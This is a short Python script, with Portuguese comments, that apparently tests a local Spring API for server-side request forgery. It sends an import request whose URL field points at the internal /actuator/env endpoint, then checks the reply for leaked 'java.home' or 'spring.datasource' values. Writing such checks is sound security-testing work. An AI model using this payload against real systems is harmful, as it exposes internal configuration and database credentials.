# Passo 1: Criar dicionário JSON
def get_json_data():
    return {
        'url_importacao': 'http://localhost:8080/actuator/env'
    }

# Passo 2: Fazer POST com a resposta JSON
def post_data(json_data):
  import requests
  response = requests.post('http://localhost:8080/api/documents/importar', json=json_data)
  return response

# Passo 3: Verificar resposta HTTP e detectar SSRF Crítica
def check_response(response):
  if 'java.home' in response.text or 'spring.datasource' in response.text:
    print('Vulnerabilidade SSRF Crítica: A API está a refletir recursos internos da infraestrutura')